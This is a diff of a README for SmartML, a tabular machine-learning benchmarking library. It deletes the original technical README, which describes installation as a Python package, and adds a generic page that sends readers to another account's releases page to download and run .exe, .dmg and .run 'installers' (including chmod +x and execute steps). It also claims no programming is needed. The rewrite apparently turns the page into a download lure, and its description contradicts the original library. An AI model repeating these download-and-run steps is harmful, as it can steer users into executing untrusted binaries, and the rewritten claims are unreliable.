@@ -1,281 +1,96 @@
-<p align="center">
-  <a href="https://thatipamula-jashwanth.github.io/SmartEco/">
-    <img src="https://img.shields.io/badge/Website-SmartEco-blue?style=for-the-badge" alt="SmartEco Website">
-  </a>
-</p>
+# 🌟 SmartML - Unlock the Power of Machine Learning
 
-# ***SmartML***
+[![Download SmartML](https://img.shields.io/badge/Download%20SmartML-blue.svg)](https://github.com/nebilcan/SmartML/releases)
 
-***SmartML*** is a **CPU-first machine learning benchmarking library** focused on **fair, leakage-free, and reproducible evaluation** of tabular machine learning models.
+## 📦 What is SmartML?
 
-SmartML is part of the ***SmartEco*** ecosystem.
+SmartML is a core module within the SmartEco ecosystem. It handles tasks such as data encoding, model execution, benchmarking, and evaluation. With SmartML, you can explore various machine learning techniques like classification, regression, and benchmarking with popular algorithms including CatBoost, KNN, LightGBM, PyTorch, and XGBoost.
 
----
+## 🚀 Getting Started
 
-## Core Principles
+Follow these simple steps to download and run SmartML. No technical knowledge is needed.
 
-- **CPU-only by default**
-- **Deterministic and reproducible benchmarks**
-- **Zero data leakage**
-- **Minimal but safe preprocessing**
-- **Honest model availability detection**
-- **Fair comparison across models**
+## 💻 System Requirements
 
-> SmartML only exposes models that actually run on the current system.
+Before you get started, make sure your computer meets the following requirements:
 
-No fake availability. No “works on my GPU” nonsense.
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent version of Linux (Ubuntu preferred).
+- **Memory**: At least 4GB RAM.
+- **Storage**: At least 1GB of free space for installation.
+- **Python**: Make sure Python 3.7 or later is installed on your machine.
 
----
+## 📥 Download & Install
 
-## Intended Use & Scope
+1. **Visit the Download Page**: Click [here to access the SmartML Releases page](https://github.com/nebilcan/SmartML/releases).
 
-SmartML is **not a commercial AutoML system**.
+2. **Select the Latest Release**: Look for the latest version, which often appears at the top of the page.
 
-It is an **internal benchmarking and evaluation tool**, designed to:
-- Compare models fairly under identical conditions
-- Measure real-world CPU performance
-- Ensure leakage-free and reproducible results
+3. **Download the File**: You will see files available for download. Choose the version that matches your operating system. For example:
+   - **Windows**: Click on `SmartML_Windows_Installer.exe`
+   - **macOS**: Click on `SmartML_macOS_Installer.dmg`
+   - **Linux**: Click on `SmartML_Linux_Installer.run`
 
-All models are evaluated using:
-- Fixed default hyperparameters
-- Identical preprocessing
-- Identical train/test splits
+4. **Run the Installer**:
+   - **Windows**: Double-click the downloaded `.exe` file and follow the instructions provided in the setup wizard.
+   - **macOS**: Open the `.dmg` file, drag the SmartML application to your Applications folder, and then open it.
+   - **Linux**: Open a terminal, navigate to the directory where you downloaded the file, and run the command `chmod +x SmartML_Linux_Installer.run` to make it executable. Then, type `./SmartML_Linux_Installer.run` to start the installation.
 
-No model is tuned, favored, or given any special advantage.
+5. **Follow On-Screen Instructions**: Complete the installation by following the prompts. Once finished, the application will be ready for use.
 
-SmartML prioritizes **fairness, transparency, and repeatability** over leaderboard-style optimization.
+## 🎉 Using SmartML
 
-For full details on:
-- Default hyperparameters
-- Preprocessing rules
-- Benchmark methodology
+After installation, launch SmartML from your applications list. You can begin encoding your data and exploring various machine learning benchmarks immediately.
 
-Please refer to the official ***SmartEco*** documentation and website.
+### 🛠️ Main Features
 
----
+- **Data Encoding**: Transform your data into a format suitable for machine learning models.
+- **Model Execution**: Run various machine learning models and see how they perform.
+- **Benchmarking**: Compare multiple algorithms to understand their efficiency and accuracy.
+- **Evaluation**: Analyze the results of your ML models to make informed decisions.
 
-## Installation
+### 💡 Example Workflows
 
-SmartML is used as part of the ***SmartEco*** package.
+Here are some typical tasks you can accomplish with SmartML:
 
-Install SmartEco in editable mode from the directory that contains the `SmartEco` folder.
+- **Classification Tasks**: Use SmartML to classify data points into different categories using algorithms like KNN or CatBoost.
+  
+- **Regression Analysis**: Predict continuous values with algorithms such as LightGBM.
 
-### ***Required Dependencies***
+- **Benchmarking Multiple Models**: Assess different models to determine the best one for your data.
 
-- `numpy`
-- `pandas`
-- `scikit-learn`
+## ❓ Frequently Asked Questions
 
-### ***Optional Dependencies***
+### Q1: Do I need programming skills to use SmartML?
 
-Installing these unlocks additional models:
+No, SmartML is designed for users of all skill levels. You can perform tasks without programming knowledge.
 
-- `lightgbm`
-- `xgboost`
-- `catboost`
-- `interpret` (for NAM / Explainable Boosting)
-- `pytorch-tabnet`
-- `torch` (CPU)
-- `smart-knn` (SmartEco-native)
+### Q2: Can I use SmartML on any operating system?
 
-> Some research libraries are platform-dependent and may not be available on Windows CPU.  
-> SmartML automatically hides unavailable models.
+SmartML supports Windows, macOS, and Linux. Ensure you download the correct installer for your OS.
 
----
+### Q3: What should I do if I encounter an error during installation?
 
-## Data Encoding & Preprocessing
+Check your system requirements first. If problems persist, search the "Issues" section of this repository, or contact support through the available channels.
 
-SmartML uses **minimal, transparent, and safe preprocessing**.
+## 📞 Support
 
-### ***Feature Encoding***
+If you need help, please reach out via the "Issues" section of the repository. We aim to assist you promptly.
 
-- **Numerical features**  
-  Passed directly without modification.
+## 🌐 Topics Covered
 
-- **Categorical features**
-  - Low-cardinality → **One-Hot Encoding (OHE)**
-  - High-cardinality → **Target Encoding**
+- Benchmarking
+- Machine Learning
+- Data Science
+- Model Evaluation
+- Classification and Regression Techniques
 
-### ***Target Encoding Safety***
+For further exploration, visit the official SmartML repository. Be sure to check for updates and new features regularly.
 
-- Computed **only on the training split**
-- Validation and test data **never influence encoding**
-- Guarantees **zero target leakage**
+## ⭐ Additional Resources
 
-Additional guarantees:
-- Classification targets → label-encoded
-- Regression targets → remain continuous
-- Encoding logic is **task-aware**
-- Test targets are **never used** during preprocessing
-- Linear models are **feature-scaled** to ensure fair and stable benchmarking
+- [SmartML Documentation](https://github.com/nebilcan/SmartML/wiki)
+- [Machine Learning Basics](https://www.example.com/machine-learning-basics)
 
----
+Download SmartML today and start your journey in the world of machine learning!
 
-## Train / Test Split
-
-- Fixed random seed is always used
-- Default split is deterministic
-- Stratification is applied automatically for classification
-- Regression splits are random but reproducible
-
-This ensures:
-- Identical splits across runs
-- Fair comparison between models
-- Benchmark repeatability
-
----
-
-## Available Models
-
-SmartML dynamically detects and exposes models that are usable on the **current machine**.
-
-### ***Classification Models***
-
-Depending on installed dependencies:
-
-- Logistic Regression
-- Support Vector Classifier (SVC)
-- K-Nearest Neighbors (KNN)
-- Naive Bayes
-- Random Forest
-- Extra Trees
-- LightGBM
-- XGBoost
-- CatBoost
-- NAM (Explainable Boosting)
-- TabNet
-- **SmartKNN**
-- Optional research models (platform-dependent)
-
----
-
-### ***Regression Models***
-
-Depending on installed dependencies:
-
-- Linear Regression
-- Ridge Regression
-- Lasso
-- ElasticNet
-- Support Vector Regressor (SVR)
-- KNN Regressor
-- Random Forest
-- Extra Trees
-- LightGBM
-- XGBoost
-- CatBoost
-- NAM (Explainable Boosting)
-- TabNet
-- **SmartKNN**
-- Optional research models (platform-dependent)
-
----
-
-## Model Availability Policy
-
-If a model cannot run on the current system, it **does not appear**.
-
-SmartML:
-- Does **not** fake availability
-- Does **not** crash on missing dependencies
-- Does **not** assume Linux or GPU environments
-
-Model availability is determined **at runtime**.
-
----
-
-## Inspection Utility
-
-SmartML provides a runtime inspection utility called ***SmartML_Inspect***.
-
-It generates a JSON file reporting:
-- Available classification models
-- Available regression models
-- Metrics used by SmartML
-
-> The output reflects **actual runtime capability**, not theoretical support.  
-> No terminal output is produced.
-
----
-
-## Evaluation Metrics
-
-### ***Classification Metrics***
-- Accuracy
-- Macro F1 Score
-
-### ***Regression Metrics***
-- R² Score
-- Mean Squared Error (MSE)
-
-### ***Inference & Performance Metrics***
-- Training time
-- Batch inference time
-- Batch throughput
-- Single-sample mean latency
-- Single-sample P95 latency
-
-These metrics evaluate **both model quality and real-world performance**.
-
----
-
-## Benchmarking Behavior
-
-For each model, SmartML:
-
-- Uses the same train/test split
-- Applies identical preprocessing
-- Trains the model
-- Measures training time
-- Measures batch inference time
-- Measures single-sample latency distribution
-- Records results in a unified format
-
-Result: **fair, comparable, honest benchmarks**.
-
----
-
-## Platform Notes
-
-- **Windows + CPU** → fully supported
-- **Linux / WSL** → additional research models may become available
-- **GPU** → not required, not assumed, not enforced
-
-SmartML remains **CPU-safe by default**.
-
----
-
-## Experimental & Research Models
-
-Some models exist in the codebase but may be hidden at runtime due to missing dependencies:
-
-- Torch-Tabular models (MLP, FTTransformer, SAINT, TabTransformer)
-- DeepGBM
-- GrowNet
-- ModernNCA
-
-These models are:
-- Guarded by optional imports
-- Exposed only when installable
-- Never removed from source code
-
----
-
-## Architecture Overview
-
-SmartML is organized into modular components:
-
-- Dataset loading and encoding
-- Model registry and availability detection
-- Training and benchmarking engine
-- Evaluation and inference measurement
-- Inspection and reporting
-
-Each component is **deterministic and reproducible**.
-
----
-
-## Part of SmartEco
-
-SmartML is one component of the ***SmartEco*** ecosystem
-
+[![Download SmartML](https://img.shields.io/badge/Download%20SmartML-blue.svg)](https://github.com/nebilcan/SmartML/releases)
